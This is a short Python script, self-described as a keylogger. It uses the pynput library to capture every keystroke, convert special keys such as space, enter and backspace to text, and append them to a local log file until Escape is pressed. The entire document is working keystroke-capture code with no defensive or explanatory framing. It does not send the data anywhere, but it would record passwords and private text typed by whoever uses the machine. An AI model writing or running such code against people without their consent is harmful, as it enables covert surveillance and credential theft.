import pynput
from pynput.keyboard import Key, Listener

# Function to record keystrokes and save them to a file
def on_press(key):
    try:
        # Convert key to printable character (e.g., 'a', 'b', 'Enter')
        key_string = key.char
    except AttributeError:
        # Handle special keys (e.g., 'Backspace', 'Enter')
        if key == Key.space:
            key_string = ' '
        elif key == Key.enter:
            key_string = '\n'
        elif key == Key.backspace:
            key_string = '<Backspace>'
        else:
            key_string = str(key)
    
    # Write the keystroke to the file
    with open('keylogger_log.txt', 'a') as f:
        f.write(key_string)

# Function to stop the keylogger when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop the listener when Escape key is pressed
        return False

# Start listening for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()